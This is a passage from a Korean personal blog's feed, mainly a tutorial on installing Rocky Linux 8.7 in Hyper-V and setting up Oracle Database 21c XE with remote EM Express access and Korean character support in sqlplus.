</ul>]]></content><author><name>Jung MinGyu</name></author><category term="cookie" /><category term="session" /><category term="token" /><summary type="html"><![CDATA[로그인 인증 방식은 여러가지가 있다.]]></summary></entry><entry><title type="html">웹서버 만들기(4)</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C4/" rel="alternate" type="text/html" title="웹서버 만들기(4)" /><published>2023-04-06T00:00:00+09:00</published><updated>2023-04-07T00:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C4</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C4/"><![CDATA[<p><a href="https://mingyu2.github.io/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C1/">웹서버 만들기(1)</a><br />
<a href="https://mingyu2.github.io/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C2/">웹서버 만들기(2)</a><br />
<a href="https://mingyu2.github.io/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C3/">웹서버 만들기(3)</a></p>

<h3 id="오라클-db-서버-만들기">오라클 db 서버 만들기</h3>
<ul>
  <li>우분투에 설치할려 했지만 잘안되서 레트햇 호환 리눅스인 rocky os에 오라클 db를 설치하려고 한다.</li>
</ul>

<h3 id="rocky-os를-가상머신에-설치하기">Rocky OS를 가상머신에 설치하기.</h3>
<ul>
  <li>흠 … <code class="language-plaintext highlighter-rouge">Rocky 9.1</code> 을 설치하니 오라클 DB 설치가 안된다.  그래서 <strong>Rocky 8.7</strong>을 다시 설치하였다. 설치 방법은 <code class="language-plaintext highlighter-rouge">Rocky 9.1</code> 방법이랑 같다.<br /><img src="https://user-images.githubusercontent.com/31990118/230143080-62432050-0c3a-44b4-aab8-5f6e94557910.png" alt="Pasted image 20230405150704" /></li>
</ul>

<ol>
  <li>Hyper-V 에서 새 가상 컴퓨터 만들기를 진행한다.<br /><img src="https://user-images.githubusercontent.com/31990118/230143421-43da0921-f3a3-43fa-9781-8c26cbb5b58c.png" alt="Pasted image 20230405011838" /></li>
  <li>세대는 2세대로 지정하였다.<br /><img src="https://user-images.githubusercontent.com/31990118/230143523-63e397a0-dbff-407f-a620-95835287a0bd.png" alt="Pasted image 20230405011904" /></li>
  <li>메모리할당, 네트워킹 구성, 가상 하드 디스크위치를 지정하고 부팅 os를 rocky8.7.iso 로 설정하고 마침을 눌러준다.</li>
  <li>rocky os 의 가상머신이 생성된 것을 확인할 수 있다.<br /><img src="https://user-images.githubusercontent.com/31990118/230143587-a9d7a935-6dc1-477a-a755-6585304af7b5.png" alt="Pasted image 20230405011655" /></li>
  <li>rocky 가상머신을 우클릭하여 설정창에 들어가 준다. 그다음 보안 창에 들어가준다. 보안  <code class="language-plaintext highlighter-rouge">Microsoft UEFI 인증 기관</code>으로 변경하고 적용해 주자.<br /><img src="https://user-images.githubusercontent.com/31990118/230143703-cad23733-cb63-43ac-8bb0-5cd334292014.png" alt="Pasted image 20230405012353" /></li>
  <li>rocky 가상머신에 연결하고 실행하고 설치를 진행하자.<br /><img src="https://user-images.githubusercontent.com/31990118/230143808-0ce9759d-05be-46c6-85b6-81ac6a81e0c6.png" alt="Pasted image 20230405150952" /></li>
  <li>만약 <code class="language-plaintext highlighter-rouge">Failde to allocate usable memory for kernel</code> 이 발생했다면 메모리 크기를 2기가 이상으로 늘려보자. 그러면 해당 오류는 사라진다.<br /><img src="https://user-images.githubusercontent.com/31990118/230143866-02f1f570-83eb-4e60-80d6-3e35614f87dd.png" alt="Pasted image 20230405013407" /></li>
  <li>설치를 진행해주면 된다.<br /><img src="https://user-images.githubusercontent.com/31990118/230143933-58c1ca7a-59eb-4bd1-b752-ee1a7e23c12a.png" alt="Pasted image 20230405151105" /><br /><img src="https://user-images.githubusercontent.com/31990118/230143988-8fe602ca-9a5b-473d-a978-061b8a6795e4.png" alt="Pasted image 20230405151154" /></li>
  <li>설치완료<br /><img src="https://user-images.githubusercontent.com/31990118/230144158-51586520-486e-4934-95ff-153443aca8c4.png" alt="Pasted image 20230405150704" /></li>
</ol>

<h3 id="오라클-db-빠른-설치하기">오라클 DB 빠른 설치하기</h3>
<ol>
  <li>먼저 <code class="language-plaintext highlighter-rouge">oracle-database-preinstall-21c-1.0-1.el8.x86_64.rpm</code> 설치를 진행한다.<br /><script src="https://gist.github.com/MinGyu2/deb4fdd6303928ae41d118e1a525076f.js"></script><img src="https://user-images.githubusercontent.com/31990118/230144242-d9f9384b-8220-42d3-8d4c-274fec310977.png" alt="Pasted image 20230405152255" /><br /><br /><img src="https://user-images.githubusercontent.com/31990118/230144284-b5e25167-b665-4cdb-b731-deed73cf01d4.png" alt="Pasted image 20230405152725" /></li>
  <li>그리고 나서 먼저 <code class="language-plaintext highlighter-rouge">wget https://download.oracle.com/otn-pub/otn_software/db-express/oracle-database-xe-21c-1.0-1.ol8.x86_64.rpm</code>  를 통해 <code class="language-plaintext highlighter-rouge">oracle-database-xe-21c-1.0-1.ol8.x86_64.rpm</code> 를 다운받고 다음 명령을 통해 설치를 진행한다.<br /><script src="https://gist.github.com/MinGyu2/f3dd9b8f726fecf0f64ac9d7b89bf2d0.js"></script><img src="https://user-images.githubusercontent.com/31990118/230144803-6525dd61-5294-4014-8629-a48f4a645ada.png" alt="Pasted image 20230405232753" /></li>
  <li><code class="language-plaintext highlighter-rouge">/etc/init.d/oracle-xe-21c configure</code> 통해 db 서버를 동작한다. 처음 동작을 시킨다면 다음과 같이 비번을 새로 지정해 줘야 한다. <br /><img src="https://user-images.githubusercontent.com/31990118/230145159-306c415e-0f8c-412d-a3d5-a716a6345928.png" alt="Pasted image 20230405232822" /><br /><br /><img src="https://user-images.githubusercontent.com/31990118/230145206-193ab464-4ce4-4697-88f4-baf45fa1062a.png" alt="Pasted image 20230405233046" /><br />위의 주소로 접속하면 접속이 잘 안될수 있다. <br /><img src="https://user-images.githubusercontent.com/31990118/230145293-5710b599-2ba4-42a7-9522-24480d0cf2a0.png" alt="Pasted image 20230405233158" /></li>
  <li>위의 문제를 해결하기 위해서 먼저 <strong>oracl user</strong> 로 전환한다.<br /><code class="language-plaintext highlighter-rouge">su - oracle</code></li>
  <li><strong>~/.bash_profile</strong> 을 편집해야한다. 다음 내용을 추가해주자.<br /><script src="https://gist.github.com/MinGyu2/3df339b075e7106f8c3be6508da83421.js"></script></li>
  <li>현재 세션에 변화를 적용하기 위해 업데이트된 <strong>.bash_profile</strong> 을 실행하자.<br /><code class="language-plaintext highlighter-rouge">source ~/.bash_profile</code></li>
  <li>이제부터 <code class="language-plaintext highlighter-rouge">리눅스의 CLI</code> 에서 <strong>Oracle RDBMS</strong> 를 실행할 수 있다.</li>
  <li><strong>lsnrctl</strong> 명령을 통해 오라클의 상태를 확인할 수 있다.<br /><code class="language-plaintext highlighter-rouge">lsnrctl status</code><br /><img src="https://user-images.githubusercontent.com/31990118/230145612-6a6ea856-f44f-47fe-8c49-e903a41b5309.png" alt="Pasted image 20230405234130" /></li>
  <li><code class="language-plaintext highlighter-rouge">sqlplus /as sysdba</code> 를 통해 <strong>SQL 커맨드 창</strong>으로 들어갈 수 있다.<br /><img src="https://user-images.githubusercontent.com/31990118/230145691-87775cdd-f998-4023-8749-5ba0c05f8121.png" alt="Pasted image 20230405234744" /></li>
  <li><code class="language-plaintext highlighter-rouge">ss -tulpn | grep 5500</code>  명령을 통해 알아봤을 때 현재 로컬에서만 <strong>EM Express</strong> 서비스에 접속할 수있다.<br /><img src="https://user-images.githubusercontent.com/31990118/230145753-d0009039-0f85-4f00-b8cb-0003ec12659d.png" alt="Pasted image 20230405234956" /></li>
  <li><strong>SQL 커맨드 창</strong> 에서 <br /><code class="language-plaintext highlighter-rouge">EXEC DBMS_XDB.SETLISTENERLOCALACCESS(FALSE);</code><br /> 입력하면 외부에서도 접속 가능하게 된다.<br /><script src="https://gist.github.com/MinGyu2/a33780e933966e16eeb7275dbf115209.js"></script><img src="https://user-images.githubusercontent.com/31990118/230145891-bcd02f3d-6797-4ac9-b8ea-ab935192094f.png" alt="Pasted image 20230405235211" /></li>
  <li><code class="language-plaintext highlighter-rouge">https://아이피주소:5500/em</code>을 통해 접속하면 된다.<br /><img src="https://user-images.githubusercontent.com/31990118/230146140-abaea83b-5c5a-4ae2-9adb-de7ad206a40f.png" alt="Pasted image 20230405235302" /></li>
  <li>사용자이름 <code class="language-plaintext highlighter-rouge">sys</code> , 비번(우리가 지정한 비번), 컨테이너 이름 <code class="language-plaintext highlighter-rouge">cdb$root</code> 를 입력하고 로그인해주면 다음 화면이 나온다.<br /><img src="https://user-images.githubusercontent.com/31990118/230146191-30b05ff1-533b-4095-ba22-9a8cfa1e1534.png" alt="Pasted image 20230406001343" /></li>
  <li>Oracle DB 설치가 아주 잘되었다!!</li>
</ol>

<h4 id="nginx--servlet--jsp--oracle-db-구현이-완료되었다">nginx + servlet + jsp , oracle DB 구현이 완료되었다!</h4>

<h3 id="oracle-db-의-sqlplus에서-한글-깨질때">Oracle DB 의 sqlplus에서 한글 깨질때.</h3>
<ol>
  <li><strong>export NLS_LANG=KOREAN_KOREA.AL32UTF8</strong> 를 <code class="language-plaintext highlighter-rouge">.bash_profile</code> 에 추가해주면 된다.</li>
  <li>그런다음 <br /><code class="language-plaintext highlighter-rouge">source ~/.bash_profile</code><br />명령으로 <code class="language-plaintext highlighter-rouge">bash_profile</code> 을 시작해주면 된다.</li>
</ol>

<h3 id="oracle">Oracle</h3>
<ol>
  <li><code class="language-plaintext highlighter-rouge">lsnrctl stop</code>,  <code class="language-plaintext highlighter-rouge">lsnrctl start</code><br /><img src="https://user-images.githubusercontent.com/31990118/230284160-75c7ed50-89c9-4a7b-a1aa-84fdfbeff56e.png" alt="Pasted image 20230406035320" />
<br /><code class="language-plaintext highlighter-rouge">nmap localhost</code></li>
  <li><code class="language-plaintext highlighter-rouge">sqlplus / as sysdba</code> 로 SQL 에 접속한다. <br /><code class="language-plaintext highlighter-rouge">startup</code> : 시작<br /><code class="language-plaintext highlighter-rouge">shutdown</code> : 중지<br /><img src="https://user-images.githubusercontent.com/31990118/230284196-83b122e4-3f46-41ad-8f31-655d2c3797c5.png" alt="Pasted image 20230406035505" />
<br /><code class="language-plaintext highlighter-rouge">nmap localhost</code></li>
</ol>

<ul>
  <li>무조건 위 순서대로 해야한다. 2 번 만하면 포트가 아무것도 안려있는것을 확인할 수 있다.</li>
</ul>

<h3 id="rocky-서버-네트워크-설정">Rocky 서버 네트워크 설정</h3>
<ul>
  <li><code class="language-plaintext highlighter-rouge">nmtui</code> 를 사용한다. 고정 아이피 설정이 가능하다.</li>
</ul>

<h3 id="참고-사이트">참고 사이트</h3>
<ul>
  <li><a href="https://www.centlinux.com/2022/06/install-oracle-database-21c-xe-on-rocky-linux.html">Install Oracle Database 21c XE on Rocky Linux 8</a></li>
  <li><a href="https://www.oracle.com/kr/database/technologies/appdev/xe/quickstart.html">Oracle Database Express Edition</a></li>
  <li><a href="https://docs.rockylinux.org/guides/network/basic_network_configuration/">Network Configuration - Documentation (rockylinux.org)</a></li>
  <li><a href="https://taisou.tistory.com/622">sqlplus 에서 한글이 깨질때 (tistory.com)</a></li>
  <li><a href="https://mkil.tistory.com/336">ORACLE DB 시작 및 중지 / 리스너 시작 및 중지 하는방법 (tistory.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="DB" /><summary type="html"><![CDATA[DB 설치 및 실행]]></summary></entry></feed>